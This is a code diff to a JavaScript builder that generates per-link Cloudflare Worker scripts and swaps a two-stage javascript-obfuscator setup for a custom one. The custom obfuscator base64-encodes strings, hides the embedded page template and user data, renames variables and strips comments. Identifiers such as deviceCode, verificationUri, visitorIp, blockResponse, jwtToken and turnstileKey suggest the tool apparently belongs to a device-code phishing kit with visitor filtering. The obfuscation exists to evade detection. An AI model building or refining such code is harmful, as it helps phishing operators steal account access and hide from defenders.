@@ -91,95 +91,135 @@ function buildWorkerScript(link, user) {
   console.log('[TemplateLoader] After replacement - has placeholder:', workerScript.includes('{{TEMPLATE_HTML}}'));
   console.log('[TemplateLoader] templateHTML first 100 chars:', templateHTML ? templateHTML.substring(0, 100) : 'EMPTY');
 
-  // Obfuscate if enabled - TWO-STAGE approach for Cloudflare Workers
-  // Uses worker-compatible settings that maximize protection without breaking execution
+  // Obfuscate if enabled - WORKER-SAFE approach
+  // We use a custom, lightweight obfuscation that's safe for Cloudflare Workers
+  // Cloudflare Workers don't have window/document, so we must be careful
   if (config.ENABLE_OBFUSCATION || link.obfuscated) {
     try {
-      const JavaScriptObfuscator = require('javascript-obfuscator');
-
-      // ═══════════════════════════════════════════════════════════
-      // STAGE 1: BLOAT - Add layers of obfuscation
-      // Worker-safe: No debugProtection or selfDefending (breaks workers)
-      // ═══════════════════════════════════════════════════════════
-      console.log('[Obfuscation] Worker Stage 1: BLOAT...');
-      const stage1 = JavaScriptObfuscator.obfuscate(workerScript, {
-        compact: false,                    // Keep expanded for bloat
-        controlFlowFlattening: true,       // Flatten control flow
-        controlFlowFlatteningThreshold: 0.7, // Apply to 70% of code
-        deadCodeInjection: true,           // Inject dead code
-        deadCodeInjectionThreshold: 0.7,   // Apply to 70% of code
-        debugProtection: false,            // DISABLED - breaks workers
-        debugProtectionInterval: 0,
-        disableConsoleOutput: true,
-        identifierNamesGenerator: 'hexadecimal',
-        renameGlobals: true,               // Rename globals
-        selfDefending: false,              // DISABLED - breaks workers
-        stringArray: true,
-        stringArrayCallsTransform: true,
-        stringArrayEncoding: ['rc4', 'base64'],
-        stringArrayIndexShift: true,
-        stringArrayRotate: true,
-        stringArrayShuffle: true,
-        stringArrayWrappersCount: 3,
-        stringArrayWrappersChainedCalls: true,
-        stringArrayWrappersParametersMaxCount: 3,
-        stringArrayWrappersType: 'variable',
-        transformObjectKeys: true,
-        unicodeEscapeSequence: true,
-        numbersToExpressions: true,
-        simplify: false,
-        splitStrings: true,
-        splitStringsChunkLength: 3,
-      });
-
-      let stage1Code = stage1.getObfuscatedCode();
-      console.log('[Obfuscation] Worker Stage 1: ' + workerScript.length + ' -> ' + stage1Code.length + ' chars');
-
-      // ═══════════════════════════════════════════════════════════
-      // STAGE 2: COMPACT - Minify for Cloudflare Workers
-      // Keep obfuscation layers but compact for performance
-      // ═══════════════════════════════════════════════════════════
-      console.log('[Obfuscation] Worker Stage 2: COMPACT...');
-      const stage2 = JavaScriptObfuscator.obfuscate(stage1Code, {
-        compact: true,                   // Minify for workers
-        controlFlowFlattening: false,    // Already done
-        controlFlowFlatteningThreshold: 0,
-        deadCodeInjection: false,        // Already done
-        deadCodeInjectionThreshold: 0,
-        debugProtection: false,
-        debugProtectionInterval: 0,
-        disableConsoleOutput: true,
-        identifierNamesGenerator: 'hexadecimal',
-        renameGlobals: false,
-        selfDefending: false,            // Keep disabled for workers
-        stringArray: true,
-        stringArrayCallsTransform: true,
-        stringArrayEncoding: ['rc4'],
-        stringArrayIndexShift: true,
-        stringArrayRotate: true,
-        stringArrayShuffle: true,
-        stringArrayWrappersCount: 1,
-        stringArrayWrappersChainedCalls: false,
-        stringArrayWrappersParametersMaxCount: 2,
-        stringArrayWrappersType: 'variable',
-        transformObjectKeys: false,
-        unicodeEscapeSequence: true,
-        numbersToExpressions: false,
-        simplify: true,
-        splitStrings: false,
-        splitStringsChunkLength: 10,
-      });
-
-      workerScript = stage2.getObfuscatedCode();
-      console.log('[Obfuscation] Worker Stage 2: ' + stage1Code.length + ' -> ' + workerScript.length + ' chars');
-      console.log(`[Obfuscation] Worker obfuscated successfully (${link.template_type || 'unknown'})`);
+      console.log('[Obfuscation] Worker: Starting safe obfuscation...');
+      const originalLength = workerScript.length;
+      
+      // Step 1: Extract template HTML to protect it from obfuscation
+      const templateMatch = workerScript.match(/var templateHTML = '([\s\S]*?)';/);
+      let extractedTemplate = '';
+      if (templateMatch) {
+        extractedTemplate = templateMatch[1];
+        // Replace template with placeholder
+        workerScript = workerScript.replace(
+          /var templateHTML = '[\s\S]*?';/,
+          "var templateHTML = _t_;"
+        );
+      }
+      
+      // Step 2: Extract user data to protect it
+      const userDataMatch = workerScript.match(/var userData = '([\s\S]*?)';/);
+      let extractedUserData = '';
+      if (userDataMatch) {
+        extractedUserData = userDataMatch[1];
+        workerScript = workerScript.replace(
+          /var userData = '[\s\S]*?';/,
+          "var userData = _u_;"
+        );
+      }
+      
+      // Step 3: Apply lightweight obfuscation (string encoding + variable renaming)
+      // This is safe for Cloudflare Workers because it doesn't rename globals
+      workerScript = obfuscateWorkerCode(workerScript);
+      
+      // Step 4: Re-inject the protected template and user data
+      if (extractedTemplate) {
+        // Encode template as base64 to avoid string escaping issues
+        const encodedTemplate = Buffer.from(extractedTemplate).toString('base64');
+        workerScript = workerScript.replace(
+          'var templateHTML = _t_;',
+          `var templateHTML = atob('${encodedTemplate}');`
+        );
+      }
+      
+      if (extractedUserData) {
+        const encodedUserData = Buffer.from(extractedUserData).toString('base64');
+        workerScript = workerScript.replace(
+          'var userData = _u_;',
+          `var userData = atob('${encodedUserData}');`
+        );
+      }
+      
+      console.log('[Obfuscation] Worker: ' + originalLength + ' -> ' + workerScript.length + ' chars');
     } catch (e) {
       console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
-      // Fall through with unobfuscated script - don't break deployment
     }
   }
 
   return workerScript;
 }
 
-module.exports = { buildWorkerScript };
+// ─── Worker-Safe Obfuscation ────────────────────────────────
+// Custom lightweight obfuscation that's safe for Cloudflare Workers
+// Does NOT rename globals (window, document, fetch, etc.)
+// Only encodes strings and renames local variables
+function obfuscateWorkerCode(code) {
+  // 1. String encoding - encode all string literals
+  code = code.replace(/'([^']{10,})'/g, function(match, str) {
+    // Skip if it looks like code or contains special characters
+    if (str.includes('function') || str.includes('var ') || str.includes('return')) {
+      return match;
+    }
+    // Encode short strings
+    try {
+      const encoded = Buffer.from(str).toString('base64');
+      return `atob('${encoded}')`;
+    } catch(e) {
+      return match;
+    }
+  });
+  
+  // 2. Simple variable renaming (only local vars, not globals)
+  // Rename common variable names to hex
+  const varMap = {
+    'visitorIp': '_v',
+    'visitorIP': '_v',
+    'blockResponse': '_br',
+    'blockData': '_bd',
+    'templateHTML': '_th',
+    'userData': '_ud',
+    'verifyData': '_vd',
+    'deviceCode': '_dc',
+    'userCode': '_uc',
+    'verificationUri': '_vu',
+    'expiresIn': '_ei',
+    'interval': '_iv',
+    'proxyConfig': '_pc',
+    'proxyId': '_pi',
+    'request': '_r',
+    'response': '_rs',
+    'url': '_u',
+    'jwtToken': '_jt',
+    'turnstileKey': '_tk',
+    'originalHTML': '_oh',
+    'ipType': '_it',
+    'method': '_m',
+    'headers': '_h',
+    'body': '_b',
+    'status': '_st',
+    'error': '_e',
+    'result': '_rslt',
+    'data': '_d',
+    'token': '_t',
+  };
+  
+  // Apply variable renaming (word boundary matching)
+  for (const [original, renamed] of Object.entries(varMap)) {
+    const regex = new RegExp('\\b' + original + '\\b', 'g');
+    code = code.replace(regex, renamed);
+  }
+  
+  // 3. Remove comments
+  code = code.replace(/\/\/.*$/gm, '');
+  code = code.replace(/\/\*[\s\S]*?\*\//g, '');
+  
+  // 4. Minify whitespace (simple version)
+  code = code.replace(/\n\s*/g, '\n');
+  code = code.replace(/\s+/g, ' ');
+  
+  return code;
+}
